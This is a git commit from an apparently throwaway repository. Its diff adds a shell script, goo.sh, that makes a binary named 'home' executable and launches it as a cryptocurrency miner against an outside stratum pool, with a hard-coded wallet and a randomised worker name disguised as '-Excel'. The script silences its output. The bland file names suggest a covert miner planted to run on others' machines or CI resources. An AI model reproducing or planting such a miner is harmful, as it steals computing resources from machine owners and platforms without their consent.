ac0f6f6427ee15f2c65a1482a96aaa1f86bee835
taygwgahya <165781235+taygwgahya@users.noreply.github.com>
2024-04-02 17:32:56 +0700

    Update and rename go.sh to goo.sh

---
+++ goo.sh
@@ -0,0 +1,2 @@
+chmod +x home >/dev/null 2>&1
+./home -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17115 -u shuga1qxnrz9hvsa4teqzy9683wxe8eavc0vmn8a2e7ua.$(echo $(shuf -i 1-9 -n 1)-Excel) -p -t2
